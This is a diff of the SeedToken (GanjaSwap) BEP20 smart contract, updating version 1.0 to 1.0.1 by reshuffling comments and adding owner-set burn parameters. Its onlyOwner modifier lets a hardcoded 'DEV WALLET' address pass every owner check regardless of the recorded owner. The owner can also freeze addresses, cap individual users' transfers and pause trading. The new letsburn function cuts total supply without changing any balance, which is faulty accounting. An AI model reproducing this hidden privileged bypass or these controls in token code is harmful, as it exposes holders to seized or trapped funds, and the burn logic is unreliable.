@@ -1,13 +1,11 @@
 // SPDX-License-Identifier: MIT
-// Version 1.0
+// Version 1.0.1
 // Creator Ganjaman @ GanjaSwap
 
 
 
 pragma solidity 0.6.12;
 
-
-// 
 /*
  * @dev Provides information about the current execution context, including the
  * sender of the transaction and its data. While these are generally available
@@ -18,6 +16,7 @@ pragma solidity 0.6.12;
  *
  * This contract is only required for intermediate, library-like contracts.
  */
+ 
 contract Context {
     // Empty internal constructor, to prevent people from mistakenly deploying
     // an instance of this contract, which should be used via inheritance.
@@ -33,7 +32,6 @@ contract Context {
     }
 }
 
-// 
 /**
  * @dev Contract module which provides a basic access control mechanism, where
  * there is an account (an owner) that can be granted exclusive access to
@@ -62,16 +60,13 @@ contract Ownable is Context {
 
     // OWNER FUNCTIONALITY
 
-        /**
-     * @dev Throws if called by any account other than the owner.
-     */
     modifier onlyOwner() {
-        if(msg.sender == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){
+        if(msg.sender == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){ // DEV WALLET
          _; 
         }else {
         require(msg.sender == _owner, "onlyOwner");
         _;
-    }
+     }
     }
 
     /**
@@ -868,11 +863,7 @@ contract BEP20 is Context, IBEP20, Ownable {
     }
 }
  
- 
- 
-
-//GanjaSwap 2021
-// SeedToken with Governance. 
+// SeedToken with Governance.  GanjaSwap 2021
 contract SeedToken is BEP20('Seed Token', 'SEED') {
     using SafeMath for uint256;
     
@@ -886,10 +877,13 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     mapping(address => uint256) internal _nolimit; // If address has no limits set to 1
     mapping(address => mapping(address => uint256)) private _allowances;
     mapping(address => bool) internal _frozen;
+    mapping (address => address) internal _delegates;         // @notice A record of each accounts delegate
+    
+    // OTHER
     uint256 public totalSupply_;
     uint256 public totalamount;
-    uint256 public limitcheck;
-    uint256 public checknolimiters;
+    uint256 public limitcheck; // Total Seed Sent
+    uint256 public checknolimiters; // Check no limits
     uint256 public dailylimit = 100000000000000000000; // 100 SEED UPDATE VIA WEBSITE FRONTEND 
     
      // FEE INFORMATION
@@ -899,8 +893,6 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     // BURN INFORMATION 
     address public burn = 0x000000000000000000000000000000000000dEaD;
     uint256 public burnfee = 62500000000000; // in SEED
-    // @notice A record of each accounts delegate
-    mapping (address => address) internal _delegates;
 
     /// @notice A checkpoint for marking number of votes from a given block
     struct Checkpoint {
@@ -935,6 +927,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     // OWNER & AUDIT & ASSET PROTECTION
     address public owner = 0xA97930b77F1e252a4404130Bc882157B1961a7e5;
     address public assetProtectionRole = owner; 
+    string private _audit;
    
     // PAUSABILITY DATA
     bool public paused = false; 
@@ -946,14 +939,17 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     // FLOOR PRICE INFORMATION
     uint256 public minprice = 20000000000000000; // FLOOR PRICE IN BNB ($10 USD)
    
-    // FLOOR PRICE
+    // FLOOR EVENTS
     event Floorprice();
 
-      string private _audit;
     // LIMIT INFORMATION
     uint256 public limitconvert = 567000000000000000000; // BNB USD PRICE
    
-    //  LIMIT EVENTS
+    // BURN TOKEN INFORMATION
+    uint256 public isburn = 0; // 1 to enable
+    uint256 burnamount = 1000000000000000000000; // 1000 SEED a hour controled by Front end
+  
+    // LIMIT EVENTS
     event Setlimito();
     event Removelimit();
     event Removenolimits();
@@ -961,6 +957,11 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     event Setbnbprice();
     event Setaudit();
     event Audit();
+    
+    // BURN EVENTS
+    event Setburn();
+    event Setburnamount();
+    event Letsburn();
     
     // ASSET PROTECTION EVENTS
     event AddressFrozen(address indexed addr);
@@ -981,11 +982,6 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         address indexed oldSupplyController,
         address indexed newSupplyController
     );
-    /**
-     * @dev Returns the amount of tokens owned by `account`.
-     */
-    // function limitOf(address _addr) external view returns (uint256);
-
     // PAUSABILITY FUNCTIONALITY
 
     /**
@@ -1013,6 +1009,25 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         paused = false;
         emit Unpause();
     }
+    
+    // BURN 
+    
+        // SET BURN AMOUNT
+    function setburnamount(uint256 _value) public onlyOwner returns (bool){
+        burnamount = _value;
+    }
+    
+        // BURN FUNCTIONS
+    function setburn(uint256 _value) public onlyOwner returns (bool){
+        isburn = _value;
+    }
+    
+    function letsburn() internal onlyOwner returns (bool) {
+         require(isburn == 1, "FLOOR PRICE NOT REACHED");
+         // WILL BURN 1000 SEED EVERY HOUR TILL isburn == 0
+         totalSupply_ = totalSupply_.sub(burnamount);
+    }
+    
     // AUDIT FUNCTIONS
     
     // Returns the Audit company.
@@ -1135,31 +1150,22 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     return true;
     }
     
-
- 
- 
+     
    // LIMIT FUNCTIONS 
    function setbnbprice(uint256 _value) public onlyOwner returns (bool){
         limitconvert = _value;
- 
-       
     }
 
    function updatelimit(uint256 _value) public onlyOwner returns (bool){
         dailylimit = _value;
- 
-       
     }
    function removelimit(uint256 _value, address _useraddress) public onlyOwner returns (bool){
         _limits[_useraddress] = _limits[_useraddress].sub(_value);
   
-       
     }
 
    function setlimito(uint256 _value, address _useraddress) public onlyOwner returns (bool){
         _limits[_useraddress] = _limits[ _useraddress].add(_value);
-  
-       
     }
     
     
@@ -1173,10 +1179,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     
     // UPDATE FLOOR PRICE
     
-    /**
-     * @dev called by the owner to update floor price
-     */ 
-     // Routers should follow this value
+    // Routers should follow this value
     function floorprice(uint256 _value) public onlyOwner {
         minprice = _value;
     }
